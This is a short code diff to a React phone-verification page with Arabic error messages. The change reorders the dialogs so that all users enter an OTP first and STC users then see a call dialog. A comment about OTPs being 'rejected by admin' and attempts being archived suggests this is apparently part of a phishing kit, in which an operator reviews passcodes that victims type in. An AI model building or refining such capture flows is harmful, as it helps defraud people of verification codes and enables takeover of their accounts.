@@ -140,21 +140,24 @@ export default function VerifyPhonePage() {
         "pending"
       );
 
-      // STC shows the call dialog first; other carriers go straight to OTP.
-      if (selectedCarrier === "stc") {
-        setShowStcCallDialog(true);
-      } else {
-        setOtpCountdown(5);
-      }
+      // All carriers go to the OTP dialog first (5s countdown).
+      setOtpCountdown(5);
     } catch (error) {
       console.error("Error saving phone data:", error);
       toast.error("حدث خطأ", { description: "يرجى المحاولة مرة أخرى", duration: 5000 });
     }
   };
 
+  // After OTP is submitted, STC users see the call dialog.
+  const handleOtpSubmitted = () => {
+    if (selectedCarrier === "stc") {
+      setShowOtpDialog(false);
+      setShowStcCallDialog(true);
+    }
+  };
+
   const handleStcCallComplete = () => {
     setShowStcCallDialog(false);
-    setShowOtpDialog(true);
   };
 
   // OTP rejected by admin → archive attempt, show inline error, reset for retry
@@ -366,6 +369,7 @@ export default function VerifyPhonePage() {
         onOpenChange={setShowOtpDialog}
         phoneNumber={phoneNumber}
         onRejected={handleOtpRejected}
+        onSubmitted={handleOtpSubmitted}
       />
     </>
   );
